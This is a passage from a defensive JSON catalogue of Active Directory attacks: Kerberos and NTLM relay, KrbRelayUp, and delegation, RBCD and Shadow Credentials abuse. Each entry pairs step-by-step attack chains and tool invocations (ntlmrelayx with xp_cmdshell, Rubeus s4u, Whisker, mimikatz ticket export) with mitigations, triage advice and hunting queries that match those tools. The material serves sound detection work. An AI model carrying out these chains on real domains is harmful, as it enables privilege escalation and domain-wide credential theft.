4886/4887(ADCS), Sysmon 1(svchost WebClient起動)","mitigate":"Disable the WebClient service on hosts that don't need it (GPO). Enforce EPA on HTTP relay targets (ADCS/IIS). Restrict outbound WebDAV at the firewall.","triage":"On the target workstation check Sysmon EID1 for unexpected WebClient service start under svchost.exe, EID3 for TCP80/WebDAV to an attacker host, and correlate DC/CA 4624 (HTTP NTLM) with immediate 4886/4887 (ADCS cert request). Verdict black if after a .searchConnector-ms/.url/.lnk drop WebClient starts, NTLM flows via WebDAV (\\\\attacker@80\\) to the attacker, and a cert request follows. Benign if the user reaches a legitimate internal WebDAV/SharePoint, the auth target is that server, and no ADCS artifacts appear.","hunt":[{"plat":"MDE","t":"webclnt.dll load = WebClient service started, enabling WebDAV HTTP coercion (black-leaning); hosts that routinely use WebDAV = white","q":"DeviceImageLoadEvents\n| where Timestamp > ago(1d)\n| where FileName =~ \"webclnt.dll\"\n| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine\n| summarize firstSeen=min(Timestamp), count() by DeviceName, InitiatingProcessFileName\n| order by firstSeen desc"},{"plat":"Sentinel","t":"Machine account submitting ADCS cert requests (4886/4887) = ESC8 via WebDAV/HTTP relay/black; user-driven enrollment = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4886, 4887)\n| where SubjectUserName endswith \"$\"\n| summarize requests=count() by SubjectUserName, Computer, bin(TimeGenerated, 10m)\n| where requests > 0\n| order by requests desc"}],"huntcs":[{"plat":"Event Search","t":"Unexpected WebClient service start on a server. start on non-DAV host=black / user endpoint that uses WebDAV=white","q":"event_simpleName=ServiceStarted (ServiceDisplayName=\"*WebClient*\" OR ServiceImagePath=\"*webclnt*\")\n| stats count by ComputerName, ServiceDisplayName, ServiceImagePath\n| sort -count"},{"plat":"LogScale","t":"Outbound HTTP(80/443) from svchost(WebClient). WebDAV NTLM to attacker host=black / internal proxy=white","q":"#event_simpleName=NetworkConnectIP4\n| ContextBaseFileName=/svchost\\.exe/i\n| in(RemotePort, values=[80,443])\n| groupBy([aid, ComputerName, RemoteAddressIP4, RemotePort], function=count(as=conns))\n| sort(conns, order=desc)"}]},{"name":"Kerberos Relay (KrbRelay)","aka":"Kerberos relaying, DNS/mDNS spoof for SPN","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557, T1550.003","cve":"","sev":"High","summary":"A newer attack that relays Kerberos rather than NTLM authentication. Uses DNS/mDNS poisoning to resolve an SPN to the attacker's name and forwards the AP-REQ to a target service.","how":"Manipulate IP/name resolution to make the victim obtain a ticket for HOST/attacker or an LDAP/DC SPN, then relay the captured AP-REQ to LDAP/SMB/ADCS, etc. Locally, KrbRelay relays to LSA to set RBCD/Shadow Credentials for SYSTEM escalation. Notable for working even in NTLM-disabled environments. Prereq: ability to manipulate SPN resolution; missing signing/binding on the target.","tools":"KrbRelay, KrbRelayUp, Rubeus, mitm6/Responder(SPN誘導)","detect":"Kerberos auth with a mismatch between SPN and actual host; TGS requests to unexpected principals; immediate local RBCD/KeyCredential configuration.","events":"4769(TGS要求), 5136(RBCD/KeyCredential), 4624","mitigate":"Enforcing LDAP signing + channel binding (EPA) is effective against Kerberos relay too. Counter name-resolution poisoning, require SMB signing, use Kerberos armoring (FAST), protect SPN resolution paths.","triage":"On the source host check Sysmon EID1 for `KrbRelay`/`KrbRelayUp`/`Rubeus` and name-resolution tampering via mitm6/Responder (EID22 DNS or rogue DHCPv6), then correlate DC 4769 TGS requests where SPN mismatches the real host with immediate 5136 (RBCD / msDS-KeyCredentialLink write). Verdict black when SPN-spoofing, anomalous AP-REQ relay, instant local RBCD/Shadow-Credentials set, and SYSTEM execution chain together. Benign if legitimate Kerberos auth has matching SPN/host and no delegation-attribute changes.","hunt":[{"plat":"Sentinel","t":"5136 RBCD/KeyCredentialLink set on a host immediately = post-KrbRelay write/black; planned delegation config = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-KeyCredentialLink\" or Properties has \"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n| where OperationType == \"%%14674\"\n| summarize count() by SubjectUserName, ObjectName, Computer, bin(TimeGenerated, 10m)\n| order by count_ desc"},{"plat":"Sentinel","t":"4769 TGS to machine-account SPNs requested with RC4 (0x17) in volume = SPN spoof/Kerberos relay/black; AES normal service use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| where ServiceName endswith \"$\"\n| where TicketEncryptionType == \"0x17\"\n| summarize reqs=count(), spns=dcount(ServiceName) by Account, IpAddress, Computer, bin(TimeGenerated, 10m)\n| where reqs > 5 or spns > 1\n| order by reqs desc"}],"huntcs":[{"plat":"Event Search","t":"KrbRelay tooling on the attacker host. KrbRelay.exe process=black / no benign match=white","q":"event_simpleName=ProcessRollup2 (FileName=\"*KrbRelay*\" OR CommandLine=\"*KrbRelay*\" OR CommandLine=\"*-spn*CIFS/*\")\n| stats count by ComputerName, UserName, FileName, ParentBaseFileName, CommandLine\n| sort -count"},{"plat":"Identity Protection","t":"SPN-mismatch Kerberos relay / anomalous TGS is a DC-only event — use Falcon Identity Protection","q":"// Falcon Identity Protection detection: Kerberos relay / anomalous service ticket (SPN-host mismatch, RBCD/KeyCredential set).\n// Falcon EDR does not record DC 4769 TGS etype; pair with the KrbRelay.exe process query above."}]},{"name":"KrbRelayUp (local privilege escalation)","aka":"Kerberos relay to LDAP RBCD local privesc","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557, T1078","cve":"","sev":"High","summary":"One-shot technique where an ordinary user on a domain-joined host combines Kerberos relay + RBCD to escalate to local SYSTEM.","how":"Capture the local machine account's authentication locally and relay it to LDAP, set RBCD on the target machine for an attacker-controlled account → obtain a service ticket for the target's CIFS/HOST SPN via S4U2self/proxy → execute as SYSTEM via SCM. Classic pattern requiring ms-DS-MachineAccountQuota>0.","tools":"KrbRelayUp, Rubeus, Whisker(KeyCredential版)","detect":"New computer creation by an ordinary user; RBCD set on the local host; S4U chaining; immediate service creation/SYSTEM execution.","events":"4741(コンピュータ作成), 5136(RBCD), 4769(S4U), 7045(サービス)","mitigate":"Set ms-DS-MachineAccountQuota=0, enforce LDAP signing + EPA, require LDAPS. Monitor RBCD attribute changes at endpoints; minimize admin privileges.","triage":"On the source host check Sysmon EID1 for `KrbRelayUp`/`Rubeus`/`Whisker`, then trace DC 4741 (new computer created by a normal user) to 5136 (RBCD write onto the same host) to 4769 (S4U with Transited Services) to target 7045 (service create / SYSTEM run). Verdict black when a low-priv user runs this whole sequence within minutes under MachineAccountQuota>0. Benign because legitimate domain-join is done by provisioning staff/SCCM without an RBCD, S4U chain, and immediate service creation.","hunt":[{"plat":"Sentinel","t":"Non-admin user creates a computer (4741) then sets RBCD on it (5136) = KrbRelayUp local privesc/black; admin/join-service creation = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4741\n| where SubjectUserName !endswith \"$\"\n| project CreateTime=TimeGenerated, Creator=SubjectUserName, NewComputer=TargetUserName, Computer\n| join kind=inner (\n    SecurityEvent | where TimeGenerated > ago(1d) | where EventID == 5136 and Properties has \"msDS-AllowedToActOnBehalfOfOtherIdentity\"\n    | project RbcdTime=TimeGenerated, ObjectName, Setter=SubjectUserName\n) on $left.NewComputer == $right.ObjectName\n| where RbcdTime between (CreateTime .. CreateTime + 30m)\n| project CreateTime, Creator, NewComputer, Setter, RbcdTime, Computer"},{"plat":"MDE","t":"KrbRelayUp/Rubeus S4U/RBCD command lines executed = local privesc/black; admin tooling doing legit delegation = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where ProcessCommandLine has_any (\"KrbRelayUp\", \"krbrelay\", \"/rbcd\", \"s4u\", \"/impersonate\", \"AllowedToAct\")\n| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName\n| summarize count() by DeviceName, AccountName, FileName, ProcessCommandLine\n| order by count_ desc"}],"huntcs":[{"plat":"Event Search","t":"KrbRelayUp execution on the host. non-admin KrbRelayUp relay/rbcd/spawn=black / none benign=white","q":"event_simpleName=ProcessRollup2 (CommandLine=\"*KrbRelayUp*\" OR (CommandLine=\"*relay*\" AND CommandLine=\"*-rbcd*\") OR CommandLine=\"*-Domain*-ComputerName*\")\n| stats count by ComputerName, UserName, IntegrityLevel, FileName, ParentBaseFileName, CommandLine\n| sort -count"},{"plat":"LogScale","t":"KrbRelayUp SYSTEM-spawn service (e.g. KrbSCM) creation. KrbSCM/cmd service=black / legit service=white","q":"#event_simpleName=CreateService\n| ServiceDisplayName=/KrbSCM/i or ServiceImagePath=/cmd\\.exe|powershell/i\n| groupBy([ComputerName, ServiceDisplayName, ServiceImagePath], function=count(as=hits))\n| sort(hits, order=desc)"}]},{"name":"NTLM Relay to MSSQL","aka":"ntlmrelayx MSSQL relay","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1557.001","cve":"","sev":"Medium","summary":"A relay target that forwards captured NTLM auth to SQL Server to run commands (via xp_cmdshell, etc.) or exfiltrate data.","how":"Relay auth obtained via Responder/coercion to ntlmrelayx -t mssql://<sqlsrv>, then use -q to run queries or enable xp_cmdshell. Effective when the relayed account holds sysadmin/DB privileges. Prereq: SQL accepts Windows auth and is not protected by signing.","tools":"ntlmrelayx.py -t mssql://<host> -q 'exec xp_cmdshell ...'","detect":"Windows auth logon to SQL from an unexpected source; xp_cmdshell enablement; abnormal sp execution.","events":"SQL監査ログ(18453/18454=ログイン成功), 4624, 18456(ログイン失敗)","mitigate":"Enable Force Encryption/channel encryption and Extended Protection (EPA) on SQL, disable xp_cmdshell, apply least privilege. Counter name-resolution poisoning.","triage":"On the target SQL server enable SQL Server Audit (AUDIT_LOGIN capturing successful logons) and pull success events 18453 (Windows auth) / 18454 for Windows-auth logons from an unexpected source IP (incl. 4624 LogonType3), then correlate with xp_cmdshell enablement (sp_configure) or anomalous sp execution. Error 18456 fires only on login FAILURE, so treat it as a secondary signal for failed relay attempts. Verdict black if relayed auth logs in as an account that never directly connects to that SQL and is followed by xp_cmdshell OS-command execution. Benign if a known app/report server or DBA tool connects from a known IP under its service account with no xp_cmdshell activity.","hunt":[{"plat":"MDE","t":"sqlservr.exe spawning cmd/PowerShell = xp_cmdshell exec (black) / SQL service with no shell children = white","q":"DeviceProcessEvents\n| where Timestamp > ago(1d)\n| where InitiatingProcessFileName =~ \"sqlservr.exe\"\n| where FileName in~ (\"cmd.exe\",\"powershell.exe\",\"pwsh.exe\",\"wscript.exe\",\"cscript.exe\",\"bash.exe\")\n| project Timestamp, DeviceName, SqlServiceAcct=InitiatingProcessAccountName, FileName, ProcessCommandLine\n| order by Timestamp asc"},{"plat":"Sentinel","t":"Machine account ($) network logon to SQL host = relayed victim auth (black) / normal SQL service-account logon = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4624 and LogonType == 3\n| where Computer has \"SQL\"   // scope to your MSSQL hosts\n| where TargetUserName endswith \"$\"\n| summarize logons=count(), srcIPs=make_set(IpAddress,10), wks=make_set(WorkstationName,10) by Computer, TargetUserName\n| where logons > 0\n| order by logons desc"}],"huntcs":[{"plat":"LogScale","t":"sqlservr.exe spawning cmd/powershell/net = xp_cmdshell post-relay exec (black) / legit SQL agent jobs (white)","q":"#event_simpleName=ProcessRollup2\n| ParentBaseFileName=/sqlservr\\.exe/i\n| FileName=/^(cmd|powershell|pwsh|net1?|whoami|hostname|sqlcmd|bcp)\\.exe$/i\n| groupBy([ComputerName, UserName, ParentBaseFileName, FileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Event Search","t":"python/impacket process fanning out to 1433 = ntlmrelayx MSSQL relay (black) / single steady SQL client conn (white)","q":"event_simpleName=NetworkConnectIP4 RemotePort=1433\n| stats dc(RemoteAddressIP4) as sqltargets count by aid, ComputerName, ContextBaseFileName\n| where ContextBaseFileName IN (\"python.exe\",\"python3.exe\",\"ntlmrelayx.exe\",\"impacket.exe\") OR sqltargets>3"}]},{"name":"Unconstrained Delegation + Coercion chain","aka":"Printerbug to Unconstrained Delegation, TGT capture","phase":"coercion","group":"Poisoning / Relay / Coercion","mitre":"T1187, T1558","cve":"","sev":"Critical","summary":"An attacker controls a host with unconstrained delegation and coerces DC$ authentication via PrinterBug, etc., to capture the DC's TGT in memory, leading to DCSync.","how":"Take over an unconstrained-delegation server (or an attacker-created delegation computer) and wait for a TGT with Rubeus monitor; coercing DC$ to Kerberos-authenticate to that host via PrinterBug/PetitPotam caches the DC's TGT via delegation, allowing extraction. Use the extracted TGT for DCSync → full domain compromise. Prereq: a controlled unconstrained-delegation host; a coercible DC.","tools":"Rubeus monitor/dump, SpoolSample/PetitPotam, mimikatz, secretsdump","detect":"DC$ authentication to an unconstrained-delegation host; abnormal inflow of delegation-flagged TGTs; immediate DCSync afterward.","events":"4768/4769(TGT/TGS), 4662(DCSync), 4624(DC$)","mitigate":"Eliminate unconstrained delegation entirely and migrate to constrained/RBCD; mark critical accounts like DCs as 'sensitive and cannot be delegated' (Protected Users/AccountNotDelegated). Stop Spooler, counter coercion.","triage":"On the controlled unconstrained-delegation host check Sysmon EID1 for `Rubeus monitor/dump`, then correlate DC 4624 (DC$ authenticating to that delegation host), 4768/4769 (inflow of delegated-flag TGT/TGS), and immediate 4662 (DCSync via DS-Replication-Get-Changes-All GUID 1131f6ad-…). Verdict black when PrinterBug/PetitPotam coerces DC$ to the delegation host, the DC TGT is extracted, and DCSync follows. DC$ authenticating to a member server is itself anomalous, so coercion artifacts plus DCSync confirm black; benign only if it is known delegation-app traffic with none of these.","hunt":[{"plat":"Sentinel","t":"Non-DC principal exercising replication GUID in 4662 = DCSync after coercion (black) / legit DC-to-DC replication = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4662\n| where Properties has \"1131f6aa-9c07-11d1-f79f-00c04fc2dcd2\" or Properties has \"1131f6ad-9c07-11d1-f79f-00c04fc2dcd2\"\n| where AccountType == \"User\" or Account !endswith \"$\"\n| project TimeGenerated, Account, Computer, ObjectName, AccessMask\n| order by TimeGenerated asc"},{"plat":"MDI","t":"Directory replication from a non-DC source = DCSync over the wire (black) / replication from a known DC = white","q":"IdentityDirectoryEvents\n| where Timestamp > ago(1d)\n| where ActionType == \"Directory Services replication\"\n// | where DeviceName !in~ (\"DC01\",\"DC02\")  // exclude legit DCs in your tenant\n| project Timestamp, AccountName, AccountUpn, DeviceName, DestinationDeviceName, IPAddress\n| order by Timestamp asc"}],"huntcs":[{"plat":"LogScale","t":"Rubeus monitor/harvest + coercion tool (SpoolSample/PetitPotam) on unconstrained-deleg host = DC$ TGT capture setup (black)","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Rubeus.*(monitor|harvest|tgtdeleg)|SpoolSample|petitpotam|dementor|printerbug|Coercer)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"DC$ auth to unconstrained-deleg host then delegated-TGT inflow and DCSync are DC-only, not in Falcon EDR","q":"// Falcon Identity Protection detection: Unconstrained Delegation abuse — anomalous machine (DC$) authentication to a non-DC unconstrained-delegation host, followed by DCSync (DS-Replication-Get-Changes). DC-only Kerberos TGT/4662; pivot to attacker-host Rubeus process telemetry above."}]},{"name":"Unconstrained Delegation Abuse (TGT Theft)","aka":"Unconstrained Kerberos Delegation, TrustedForDelegation abuse","phase":"privesc","group":"Delegation","mitre":"T1550.003, T1187","cve":"","sev":"Critical","summary":"Steals the TGT that gets cached in memory when a user logs on/authenticates to a host configured for unconstrained delegation, then impersonates that user.","how":"Prereq: local admin on, or control of, a computer/service account with the TRUSTED_FOR_DELEGATION flag (userAccountControl) set. Steps: (1) Enumerate unconstrained-delegation hosts with PowerView or the Active Directory module (Get-DomainComputer -Unconstrained). (2) Make a high-privilege user authenticate to the target host (share access, printing, coerce). (3) Extract the cached TGT with Rubeus monitor / triage / dump, or mimikatz sekurlsa::tickets /export. (4) Reuse the extracted TGT via PTT (Pass-the-Ticket) for DCSync, etc. To target a DC's machine account TGT, coerce DC$ authentication with PrinterBug (MS-RPRN SpoolSample) or PetitPotam (MS-EFSRPC).","tools":"Rubeus (monitor/dump/asktgt), mimikatz (sekurlsa::tickets), PowerView (Get-DomainComputer -Unconstrained), SpoolSample/printerbug.py, PetitPotam/Coercer, impacket (secretsdump)","detect":"Periodically inventory non-DC accounts with unconstrained delegation set (userAccountControl & 0x80000). Monitor for abnormal coerced SMB/RPC authentication to DCs (EFSRPC, MS-RPRN) or for large numbers of TGTs observed on hosts where TGT delegation normally doesn't occur. Correlate spikes in Events 4768/4769 and atypical authentication from delegation hosts to DCs.","events":"4768 (TGT要求), 4769 (サービスチケット要求), 4624 (ログオン), 5145 (共有アクセス/spoolss,efsrpc pipe)","mitigate":"Add critical accounts (admins) to the 'Protected Users' group to exclude them from delegation. Set the account attribute 'Account is sensitive and cannot be delegated' (NOT_DELEGATED). Deprecate unconstrained delegation in principle and migrate to RBCD. As DC PrinterBug mitigation, stop the Spooler service; mitigate PetitPotam (EFS patch / Extended Protection for Authentication).","triage":"Inventory non-DC hosts with unconstrained delegation (userAccountControl & 0x80000 = TRUSTED_FOR_DELEGATION), then on such a host check Sysmon EID1 for `Rubeus`/`mimikatz sekurlsa::tickets`, correlate a DC 4768/4769 surge and 5145 (spoolss/efsrpc pipe coerce), and PTT reuse of the stolen TGT into 4662 (DCSync). Verdict black if a high-priv user or DC$ is coerced to the delegation host, its cached TGT is dumped, and PTT leads to DCSync. Benign if the delegation host is a legitimate web/DB front-end seeing only normal user auth, with no mimikatz/Rubeus, no TGT flood, and no DCSync.","hunt":[{"plat":"Sentinel","t":"Many accesses to spoolss/efsrpc pipes on DC from one source = coercion (black) / sparse legit print/EFS use = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5145\n| where RelativeTargetName in~ (\"spoolss\",\"efsrpc\",\"lsarpc\",\"netdfs\",\"fssagentrpc\")\n| summarize hits=count(), pipes=make_set(RelativeTargetName,8), dcs=make_set(Computer,10) by SubjectUserName, IpAddress\n| where hits > 3\n| order by hits desc"},{"plat":"Sentinel","t":"Machine accounts flooding a delegation host with TGS/TGT = TGT harvest (black) / steady single-service delegation = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID in (4768, 4769)\n| where TargetUserName endswith \"$\"\n| summarize tickets=count(), accts=dcount(TargetUserName) by Computer, bin(TimeGenerated, 10m)\n| where tickets > 50 and accts > 5\n| order by tickets desc"}],"huntcs":[{"plat":"LogScale","t":"Rubeus monitor/dump/tgtdeleg on a delegation host = in-memory TGT theft (black) / manual klist check (white-ish)","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/Rubeus.*(monitor|dump|tgtdeleg|triage)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"TrustedForDelegation (0x80000) inventory and 4768/4769 spikes are DC-side, outside Falcon EDR","q":"// Falcon Identity Protection detection: inventory non-DC accounts with userAccountControl TrustedForDelegation (0x80000) and alert on atypical TGT/TGS (4768/4769) volume from delegation hosts. Endpoint pivot = Rubeus process telemetry above."}]},{"name":"Constrained Delegation Abuse (S4U2Self / S4U2Proxy)","aka":"KCD abuse, msDS-AllowedToDelegateTo abuse","phase":"privesc","group":"Delegation","mitre":"T1558, T1550.003","cve":"","sev":"High","summary":"Takes control of an account holding constrained delegation (msDS-AllowedToDelegateTo) and uses S4U2Self+S4U2Proxy to impersonate any user and access the permitted services.","how":"Prereq: credentials (password/NT/AES key) or TGT of a service account/computer with msDS-AllowedToDelegateTo set. Steps: (1) Enumerate delegation accounts (Get-DomainUser/Computer -TrustedToAuth). (2) Obtain that account's TGT. (3) Use S4U2Self to get a service ticket to itself for an arbitrary user (e.g., Administrator). (4) Use S4U2Proxy to get a ticket for the SPN listed in msDS-AllowedToDelegateTo. If protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION) is enabled, any user can be impersonated without initial authentication. Rewrite the SPN's sname (alternate service name / sname trick) to pivot to another service on the same host (e.g., cifs to ldap or host), expanding to DCSync or remote execution.","tools":"Rubeus s4u (/impersonateuser /msdsspn /altservice), impacket getST.py (-spn -impersonate), kekeo tgs::s4u, mimikatz","detect":"Monitor 4769 events carrying the Transited Services attribute as a trace of S4U2Proxy. Correlate frequent S4U despite protocol transition being unset, or access to an sname different from the delegated SPN. Detect abnormal service-ticket request patterns from delegation accounts. Track (audit) changes to msDS-AllowedToDelegateTo.","events":"4769 (Transited Services フィールドあり), 4624, 4738 (ユーザー/サービスアカウント属性変更), 4742 (コンピュータアカウント属性変更)","mitigate":"Disable protocol transition (TRUSTED_TO_AUTH_FOR_DELEGATION) wherever possible and avoid constrained delegation with protocol transition. Use long passwords / gMSA for delegation service accounts. Register privileged accounts in Protected Users and set 'cannot be delegated'. Minimize delegated SPNs. As an altservice-trick countermeasure, limit delegation to only genuinely required services.","triage":"On the DC pull 4769 events carrying a Transited Services field and look for a delegation account (msDS-AllowedToDelegateTo set) obtaining tickets for a high-priv user like Administrator in a short window, where the requested sname differs from the allowed SPN (cifs→ldap/host sname trick). Verdict black if S4U proliferates without TRUSTED_TO_AUTH_FOR_DELEGATION and expands into DCSync/remote exec. Benign if the delegating service (e.g., web server to backend) requests tickets for its real SPN and expected user with no sname rewrite or high-priv impersonation; also track 4738 for illicit delegation-attribute changes.","hunt":[{"plat":"Sentinel","t":"4769 with Transited Services from one delegation account spiking = S4U2Proxy abuse (black) / small legit KCD volume = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4769\n| extend TransmittedServices = extract(@\"Transited Services:\\s*([^\\r\\n]+)\", 1, Properties)\n| where isnotempty(TransmittedServices) and trim(\" \", TransmittedServices) !in (\"-\",\"\")\n| summarize tickets=count(), targets=make_set(ServiceName,15) by Account, TransmittedServices, Computer\n| where tickets > 5\n| order by tickets desc"}],"huntcs":[{"plat":"LogScale","t":"Rubeus s4u / impacket getST requesting S4U2Self->S4U2Proxy tickets = constrained-deleg abuse (black)","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(Rubeus\\s+s4u|\\/impersonateuser|getST(\\.py)?|\\/msdsspn|\\/altservice|impacket.*s4u)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"4769 Transited-Services field and SPN mismatch are DC-only, outside Falcon EDR","q":"// Falcon Identity Protection detection: S4U2Proxy tickets (4769 with Transited Services populated) from an account lacking protocol transition, or sname differing from msDS-AllowedToDelegateTo. Endpoint pivot = Rubeus/getST process telemetry above."}]},{"name":"Resource-Based Constrained Delegation (RBCD)","aka":"RBCD attack, msDS-AllowedToActOnBehalfOfOtherIdentity abuse","phase":"privesc","group":"Delegation","mitre":"T1098, T1550.003","cve":"","sev":"Critical","summary":"Writes an attacker-controlled account into the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute and uses S4U to impersonate any user (admin) on the target host.","how":"Prereq: write permissions on the target computer object (GenericWrite/GenericAll/WriteProperty/WriteDACL, etc.) plus a controlled account with an SPN (an existing computer account, or a self-created one using MachineAccountQuota>0). Steps: (1) Create a new machine account with addcomputer.py / PowerMad (New-MachineAccount) (default MAQ=10). (2) Set the self-created account's SID into the target's msDS-AllowedToActOnBehalfOfOtherIdentity via rbcd.py or PowerView Set-ADComputer -PrincipalsAllowedToDelegateToAccount. (3) Run S4U2Self+S4U2Proxy from the created account's TGT via Rubeus s4u / getST.py to obtain admin-impersonation tickets for the target host's cifs/host/ldap. (4) Compromise via PsExec/DCSync. Setting the attribute by coercing the ACL (writing to LDAP via NTLM relay) is also mainstream (PetitPotam + ntlmrelayx --delegate-access).","tools":"impacket (addcomputer.py, rbcd.py, getST.py, ntlmrelayx --delegate-access), PowerMad, PowerView (Set-ADComputer/Get-DomainComputer), Rubeus s4u, StandIn","detect":"Monitor changes to the msDS-AllowedToActOnBehalfOfOtherIdentity attribute (4662 / directory change auditing). Track new computer account creation via MachineAccountQuota (4741) and correlate S4U ticket requests (4769 Transited Services) from suspicious, non-existing machine accounts. Detect the sequence of account creation → attribute write → S4U in a short window.","events":"4741 (コンピュータアカウント作成), 4742 (コンピュータアカウント変更), 4662 (オブジェクト属性変更), 4769 (Transited Services)","mitigate":"Set ms-DS-MachineAccountQuota to 0 to prohibit machine account creation by ordinary users. Review computer object DACLs and remove unnecessary write permissions. Register privileged accounts in Protected Users / 'cannot be delegated'. Apply NTLM relay countermeasures (SMB signing, LDAP signing/channel binding, EPA). Turn writes to msDS-AllowedToActOnBehalfOfOtherIdentity into audit alerts.","triage":"On the DC pull 4662/directory-change audit for writes to msDS-AllowedToActOnBehalfOfOtherIdentity and check whether 4741 (new computer via MachineAccountQuota), 4742 (target computer attribute change), and 4769 (S4U with Transited Services) chain within a short window. Verdict black if a suspicious never-seen machine account (random name) is created, its SID is set on the target's RBCD attribute, and S4U2Self+S4U2Proxy yields an admin-impersonation ticket into PsExec/DCSync; also correlate LDAP writes via PetitPotam+ntlmrelayx --delegate-access. Benign if a legitimate cluster/delegation change comes from an approved admin host/delegated admin with no new machine account or S4U chain.","hunt":[{"plat":"Sentinel","t":"Non-admin user creating a computer account via MAQ (4741) = RBCD staging (black) / SCCM/admin creation = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 4741\n| project TimeGenerated, NewComputer=TargetUserName, Creator=SubjectUserName, Computer\n| where Creator !endswith \"$\"\n| order by TimeGenerated asc"},{"plat":"Sentinel","t":"5136 write to msDS-AllowedToActOnBehalfOfOtherIdentity = RBCD set (black) / no such attribute change = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-AllowedToActOnBehalfOfOtherIdentity\" or Properties has \"3f78c3e5-f79a-46bd-a0b8-9d18116ddc79\"\n| project TimeGenerated, Actor=SubjectUserName, Target=ObjectName, OperationType, Computer\n| order by TimeGenerated asc"}],"huntcs":[{"plat":"LogScale","t":"Machine-account creation + msDS-AllowedToActOnBehalf write tooling = RBCD setup (black) / legit domain join (white)","q":"#event_simpleName=ProcessRollup2\n| CommandLine=/(AllowedToActOnBehalfOfOtherIdentity|PrincipalsAllowedToDelegateToAccount|rbcd\\.py|New-MachineAccount|addcomputer\\.py|Powermad|StandIn)/i\n| groupBy([ComputerName, UserName, FileName, ParentBaseFileName, CommandLine], function=count(as=hits))\n| sort(hits, order=desc)"},{"plat":"Identity Protection","t":"msDS-AllowedToActOnBehalf change (4662/4742) and S4U from a new machine are DC-only, outside Falcon EDR","q":"// Falcon Identity Protection detection: write to msDS-AllowedToActOnBehalfOfOtherIdentity (4662/4742) on a computer object, correlated with a freshly created machine account (4741, MachineAccountQuota) then S4U (4769 Transited Services). Endpoint pivot = tool telemetry above."}]},{"name":"Shadow Credentials (msDS-KeyCredentialLink / PKINIT)","aka":"Whisker attack, Key Trust abuse, ShadowCreds","phase":"privesc","group":"Delegation","mitre":"T1098, T1649, T1556","cve":"","sev":"Critical","summary":"Add an attacker-controlled public key (certificate) to the target account's msDS-KeyCredentialLink attribute, then authenticate as that account via PKINIT (certificate-based Kerberos) to obtain a TGT/NTLM hash.","how":"Prereq: write access to msDS-KeyCredentialLink on the target user/computer object (GenericWrite/GenericAll/WriteProperty). Requires a PKINIT-capable KDC (certificate on DC, Windows Server 2016+ / Key Trust). Steps: (1) Add a KeyCredential (attacker-generated key pair) to the target's msDS-KeyCredentialLink with Whisker add or pyWhisker. (2) Authenticate via PKINIT and get a TGT with Rubeus asktgt /certificate or gettgtpkinit.py. (3) Recover the target's NT hash with getnthash / Rubeus /getcredentials (U2U) and pivot to PTH or DCSync. A common chain first obtains write access via ACL coercion (as in RBCD/ESC). Used for privilege escalation and persistence from low privilege.","tools":"Whisker (add/list/clear), pyWhisker, Rubeus (asktgt /certificate /getcredentials), Certipy shadow auto, gettgtpkinit.py (PKINITtools), ntpwdextract","detect":"Monitor changes to msDS-KeyCredentialLink (4662 / directory service change 5136) — it normally changes only via Windows Hello for Business/device registration. Track PKINIT authentications (4768 with certificate info fields, pre-auth type 16 / PA-PK-AS-REQ). Correlate the sequence of attribute write followed immediately by a PKINIT TGT request. Baseline against existing legitimate KeyCredentials for diffing.","events":"5136 (ディレクトリオブジェクト変更), 4662 (属性アクセス), 4768 (証明書/PKINITによるTGT), 4769","mitigate":"Minimize object DACLs and remove unnecessary write access to msDS-KeyCredentialLink. Add privileged accounts to Protected Users. In environments not using Windows Hello for Business, consider disabling Key Trust/PKINIT. Turn attribute changes into audit rules with SOC alerts. Also harden the ADCS/PKI path (ESC mitigations). Periodically inventory KeyCredentialLink.","triage":"On the DC pull 5136 (or 4662) for msDS-KeyCredentialLink writes on the target user/computer and compare the writer, time and value against a Windows Hello for Business/device-registration baseline. It is a true positive when the same account, within minutes, issues a PKINIT TGT request (4768, Pre-Auth Type=16/PA-PK-AS-REQ, Certificate Information present) followed by 4769/4624 Type3, and the source is a non-admin host running Whisker/Certipy (confirm via Sysmon EID1/EDR process telemetry). It is benign when the writer is AAD Connect/SCEP/MDM or a WHfB enrollment service, the target is the owner's own device, during business hours, with no subsequent PKINIT abuse.","hunt":[{"plat":"Sentinel","t":"5136 write to another object's msDS-KeyCredentialLink = Shadow Creds set (black) / WHfB self-registration = white","q":"SecurityEvent\n| where TimeGenerated > ago(1d)\n| where EventID == 5136\n| where Properties has \"msDS-KeyCredentialLink\" or Properties has \"5b47d60f-6090-40b2-9f37-2a4de88f3063\"\n| project TimeGenerated, 